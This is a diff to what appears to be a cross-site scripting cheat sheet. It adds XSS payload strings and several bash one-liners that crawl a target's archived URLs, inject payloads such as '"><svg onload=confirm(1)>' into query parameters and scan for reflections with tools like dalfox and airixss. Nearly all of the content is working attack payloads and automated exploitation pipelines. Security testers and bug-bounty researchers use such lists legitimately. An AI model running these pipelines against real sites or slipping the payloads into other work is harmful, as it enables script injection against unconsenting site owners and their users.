@@ -38,6 +38,8 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 "><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
 "><html><select %00 onControl onpointerenter=prompt(domain) hello>
 "><input %00 onControl hello oninput=confirm(domain) x>
+";alert(document.domain);/
+*;var%20dk4trin="*/";
 ```
 
 #### XSS Auto Bash Exploitation :
@@ -46,4 +48,13 @@ cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{thi
 ```
 ```
 echo https://example [.]com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+```
+```
+waybackurls https://example [.]com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+```
+```
+echo target.txt | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+```
+```
+cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
 ```
